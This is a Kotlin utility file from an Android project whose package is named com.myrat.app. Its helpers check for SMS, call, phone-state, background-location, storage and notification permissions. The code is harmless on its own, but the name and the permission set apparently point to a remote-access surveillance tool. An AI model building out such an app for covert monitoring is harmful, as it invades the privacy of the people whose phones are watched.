package com.myrat.app.utils

import android.Manifest
import android.content.Context
import android.content.pm.PackageManager
import android.os.Build
import androidx.core.content.ContextCompat

object PermissionUtils {
    
    fun hasAllSmsPermissions(context: Context): Boolean {
        return hasPermissions(context, 
            Manifest.permission.RECEIVE_SMS,
            Manifest.permission.READ_SMS,
            Manifest.permission.SEND_SMS
        )
    }
    
    fun hasAllCallPermissions(context: Context): Boolean {
        return hasPermissions(context,
            Manifest.permission.CALL_PHONE,
            Manifest.permission.READ_PHONE_STATE,
            Manifest.permission.READ_PHONE_NUMBERS
        )
    }
    
    fun hasAllLocationPermissions(context: Context): Boolean {
        val foregroundPermissions = hasPermissions(context,
            Manifest.permission.ACCESS_FINE_LOCATION,
            Manifest.permission.ACCESS_COARSE_LOCATION
        )
        
        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            foregroundPermissions && hasPermissions(context, Manifest.permission.ACCESS_BACKGROUND_LOCATION)
        } else {
            foregroundPermissions
        }
    }
    
    fun hasStoragePermissions(context: Context): Boolean {
        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            hasPermissions(context, Manifest.permission.READ_MEDIA_IMAGES)
        } else {
            hasPermissions(context, Manifest.permission.READ_EXTERNAL_STORAGE)
        }
    }
    
    fun hasNotificationPermissions(context: Context): Boolean {
        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            hasPermissions(context, Manifest.permission.POST_NOTIFICATIONS)
        } else {
            true
        }
    }
    
    private fun hasPermissions(context: Context, vararg permissions: String): Boolean {
        return permissions.all { permission ->
            ContextCompat.checkSelfPermission(context, permission) == PackageManager.PERMISSION_GRANTED
        }
    }
}